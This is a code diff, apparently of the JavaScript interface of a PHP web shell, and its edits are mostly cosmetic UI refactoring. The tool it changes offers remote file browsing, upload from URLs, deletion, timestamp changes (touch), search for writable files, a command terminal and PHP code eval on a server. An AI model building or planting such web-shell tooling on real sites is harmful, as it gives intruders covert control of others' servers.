@@ -1,74 +1,10 @@
-var editSuccess = '';
-
-Zepto(function($){
-	var now = new Date();
-	output("started @ "+ now.toGMTString());
-	output("cwd : "+get_cwd());
-	output("module : "+module_to_load);
-
-	/* TAB START */
-	show_tab();
-	xpl_bind();
-	eval_init();
-
-	xpl_update_status();
-
-	$('.menuitem').on('click', function(e){
-		selectedTab = $(this).attr('href').substr(2);
-		show_tab(selectedTab);
-	});
-
-	$('#logout').on('click', function(e){
-		var cookie = document.cookie.split(';');
-		for(var i=0; i<cookie.length; i++){
-			var entries = cookie[i], entry = entries.split("="), name = entry[0];
-			document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-		}
-		localStorage.clear();
-		location.href = targeturl;
-	});
-
-	$('#totop').on('click', function(e){
-		$(window).scrollTop(0);
-	});
-	$('#totop').on('mouseover', function(e){
-		onScroll = true;
-		clearTimeout(scrollTimer);
-		start_scroll('top');
-	});
-	$('#totop').on('mouseout', function(e){
-		onScroll = false;
-		scrollCounter = 0;
-	});
-	$('#tobottom').on('click', function(e){
-		$(window).scrollTop($(document).height()-$(window).height());
-	});
-	$('#tobottom').on('mouseover', function(e){
-		onScroll = true;
-		clearTimeout(scrollTimer);
-		start_scroll('bottom');
-	});
-	$('#tobottom').on('mouseout', function(e){
-		onScroll = false;
-		scrollCounter = 0;
-	});
-
-	if(history.pushState){
-		window.onpopstate = function(event) { refresh_tab(); };
-	}
-	else{
-		window.historyEvent = function(event) {	refresh_tab(); };
-	}
-	/* TAB END */
-
-});
 
 function action(path, type){
 	title = "Action";
 	content = '';
-	if(type=='file') content = "<table class='boxtbl'><tr><td colspan='4'><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><input type='button' class='edit button' value='edit'></td><td><input type='button' class='ren button' value='rename'></td><td><input type='button' class='del button' value='delete'></td><td><input type='button' class='dl button' value='download'></td></tr></table>";
-	if(type=='dir') content = "<table class='boxtbl'><tr><td colspan='4'><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><input type='button' class='find button' value='find'></td><td><input type='button' class='ren button' value='rename'></td><td><input type='button' class='del button' value='delete'></td><td><input type='button' class='ul button' value='upload'></td></tr></table>";
-	if(type=='dot') content = "<table class='boxtbl'><tr><td colspan='4'><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><input type='button' class='find button' value='find'></td><td><input type='button' class='ren button' value='rename'></td><td><input type='button' class='del button' value='delete'></td><td><input type='button' class='ul button' value='upload'></td></tr><tr data-path='"+path+"'><td colspan='2'><input type='button' class='newfile button' value='new file'></td><td colspan='2'><input type='button' class='newfolder button' value='new folder'></td></tr></table>";
+	if(type=='file') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";
+	if(type=='dir') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";
+	if(type=='dot') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";
 	show_box(title, content);
 	xpl_bind();
 }
@@ -85,9 +21,9 @@ function navigate(path, showfiles){
 					$('#explorer').html(splits[2]);
 					sorttable.k($('#xplTable').get(0));
 				}
-				//set_cookie('cwd', splits[0]);
 				$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
 				xpl_bind();
+				window_resize();
 			}
 		}
 	});
@@ -127,7 +63,7 @@ function view_entry(el){
 
 function ren(path){
 	title = "Rename";
-	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><input type='button' class='button' onclick='ren_go();' value='rename'></td></tr></table>";
+	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
 	show_box(title, content);
 }
 
@@ -147,7 +83,7 @@ function ren_go(){
 function newfolder(path){
 	title = "New Folder";
 	path = path + 'newfolder-' + time();
-	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick='newfolder_go();' value='create'></td></tr></table>";
+	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
 	show_box(title, content);
 }
 
@@ -165,7 +101,7 @@ function newfolder_go(){
 function newfile(path){
 	title = "New File";
 	path = path + 'newfile-' + time();
-	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick='newfile_go();' value='create'></td></tr></table>";
+	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
 	show_box(title, content);
 }
 
@@ -182,7 +118,7 @@ function newfile_go(){
 
 function viewfileorfolder(){
 	title = "View File / Folder";
-	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><input type='button' class='button' onclick='viewfileorfolder_go();' value='view'></td></tr></table>";
+	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
 	show_box(title, content);
 }
 
@@ -204,7 +140,7 @@ function viewfileorfolder_go(){
 
 function del(path){
 	title = "Delete";
-	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick='delete_go();' value='delete'></td></tr></table>";
+	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
 	show_box(title, content);
 }
 
@@ -220,8 +156,8 @@ function delete_go(){
 }
 
 function find(path){
-	findfile = "<table class='boxtbl'><thead><tr><th colspan='3'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:140px'>Search in</td><td colspan='2'><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td>Filename contains</td><td style='width:400px;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex (pcre)</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>File contains</td><td><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex (pcre)</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td colspan='2'><span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span></td></tr></tbody><tfoot><tr><td><input type='button' class='button navbar' value='explorer' data-path='"+path+"'></td><td colspan='2'><input type='button' class='button' onclick=\"find_go_file();\" value='find'></td></tr><tr><td colspan='3' class='findfileResult'></td></tr></tfoot></table>";
-	findfolder = "<table class='boxtbl'><thead><tr><th colspan='3'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:140px'>Search in</td><td colspan='2'><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td>Foldername contains</td><td style='width:400px;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex (pcre)</span>&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td colspan='2'><span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findReadable'></span><span class='floatLeft'>Readable</span></td></tr></tbody><tfoot><tr><td><input type='button' class='button navbar' value='explorer' data-path='"+path+"'></td><td colspan='2'><input type='button' class='button' onclick=\"find_go_folder();\" value='find'></td></tr><tr><td colspan='3' class='findResult'></td></tr></tfoot></table>";
+	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:140px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
+	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:140px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findReadable'></span><span class='floatLeft'>Readable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
 	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
 	cbox_bind('xplUpload');
 }
@@ -279,8 +215,8 @@ function ul_go_url(){
 }
 
 function ul(path){
-	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><input type='button' class='button navbar' value='explorer' data-path='"+path+"'></td><td><input type='button' class='button' onclick=\"ul_go_comp();\" value='upload'></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
-	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><input type='button' class='button navbar' value='explorer' data-path='"+path+"'></td><td><input type='button' class='button' onclick=\"ul_go_url();\" value='upload'></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
+	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
+	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
 	content = ulcomputer + '<br>' + ulurl + "<input type='hidden' class='ul_path' value='"+path+"'>";
 	$('#explorer').html(content);
 	ul_add_comp();
@@ -480,7 +416,7 @@ function mass_act(type){
 			if(bufferAction=='cut') title = 'move';
 			else if(bufferAction=='copy') title = 'copy';
 
-			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick=\"mass_act_go('paste');\" value='"+title+"'></td></tr></table>";
+			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 
@@ -498,7 +434,7 @@ function mass_act(type){
 			massBuffer = $.trim(massBuffer);
 			title = type;
 
-			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick=\"mass_act_go('"+arcType+"');\" value='extract'></td></tr></table>";
+			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 	}
@@ -526,7 +462,7 @@ function mass_act(type){
 			massBuffer = $.trim(massBuffer);
 			title = type;
 
-			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><input type='button' class='button' onclick=\"mass_act_go('"+arcType+"');\" value='compress'></td></tr></table>";
+			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 	}
@@ -546,7 +482,7 @@ function mass_act(type){
 				line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
 			}
 
-			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><input type='button' class='button' onclick=\"mass_act_go('"+type+"');\" value='"+title+"'></td></tr></table>";
+			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 	}
@@ -710,7 +646,7 @@ function xpl_bind(){
 
 	$('.action').off('click');
 	$('.action').on('click', function(e){
-		path = html_safe(xpl_href($(this)))
+		path = html_safe(xpl_href($(this)));
 		action(path, 'file');
 	});
 
@@ -775,14 +711,11 @@ function multimedia(path){
 	hide_box();
 }
 
-
-terminal_history = new Array();
-terminal_history_pos = 0;
 $('#terminalInput').on('keydown', function(e){
 	if(e.keyCode==13){
 		cmd = $('#terminalInput').val();
-		terminal_history.push(cmd);
-		terminal_history_pos = terminal_history.length;
+		terminalHistory.push(cmd);
+		terminalHistoryPos = terminalHistory.length;
 		if(cmd=='clear'||cmd=='cls'){
 			$('#terminalOutput').html('');
 		}
@@ -803,26 +736,22 @@ $('#terminalInput').on('keydown', function(e){
 		setTimeout("$('#terminalInput').focus()",100);
 	}
 	else if(e.keyCode==38){
-		if(terminal_history_pos>0){
-			terminal_history_pos--;
-			$('#terminalInput').val(terminal_history[terminal_history_pos]);
-			if(terminal_history_pos<0) terminal_history_pos = 0;
+		if(terminalHistoryPos>0){
+			terminalHistoryPos--;
+			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
+			if(terminalHistoryPos<0) terminalHistoryPos = 0;
 		}
 	}
 	else if(e.keyCode==40){
-		if(terminal_history_pos<terminal_history.length-1){
-			terminal_history_pos++;
-			$('#terminalInput').val(terminal_history[terminal_history_pos]);
-			if(terminal_history_pos>terminal_history.length) terminal_history_pos = terminal_history.length;
+		if(terminalHistoryPos<terminalHistory.length-1){
+			terminalHistoryPos++;
+			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
+			if(terminalHistoryPos>terminalHistory.length) terminalHistoryPos = terminalHistory.length;
 		}
 	}
 	fix_tabchar(this, e);
 });
 
-
-
-var evalSupported = "";
-var evalReady = false;
 function eval_go(){
 	evalType = $('#evalType').val();
 	evalInput = $('#evalInput').val();
@@ -878,12 +807,10 @@ function eval_bind(){
 	}
 	$('#evalType').on('change', function(e){
 		if($('#evalType').val()=='php'){
-			$('#evalOptions').hide();
-			$('#evalArguments').hide();
+			$('#evalAdditional').hide();
 		}
 		else{
-			$('#evalOptions').show();
-			$('#evalArguments').show();
+			$('#evalAdditional').show();
 		}
 	});
 	$('#evalOptions').on('focus', function(e){
